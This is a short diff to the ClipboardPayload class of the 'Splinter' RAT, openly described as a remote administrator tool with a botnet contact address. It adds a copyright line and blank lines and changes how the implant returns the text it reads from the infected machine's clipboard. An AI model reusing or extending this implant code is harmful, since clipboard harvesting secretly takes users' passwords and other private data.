@@ -6,6 +6,8 @@
 	Splinter - The RAT (Remote Administrator Tool)
 	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
 	Copyright 2013 Solomon Sonya
+	
+	This copyright applies to the entire Splinter Project and all relating source code
 
 	This program is free software: you are free to  redistribute 
     it under the terms of the GNU General Public License as published by
@@ -45,6 +47,8 @@
 	Email	--> splinterbotnet@gmail.com
 	GitHub	--> https://github.com/splinterbotnet
 **/
+
+
 
 
 package Implant.Payloads;
@@ -100,7 +104,7 @@ public class ClipboardPayload
 
       if ((extract_clipboard != null) && (clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor)))
       {
-        return clipboard_Contents.getTransferData(DataFlavor.stringFlavor);
+        return ""+clipboard_Contents.getTransferData(DataFlavor.stringFlavor);
       }
 
       return " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *";
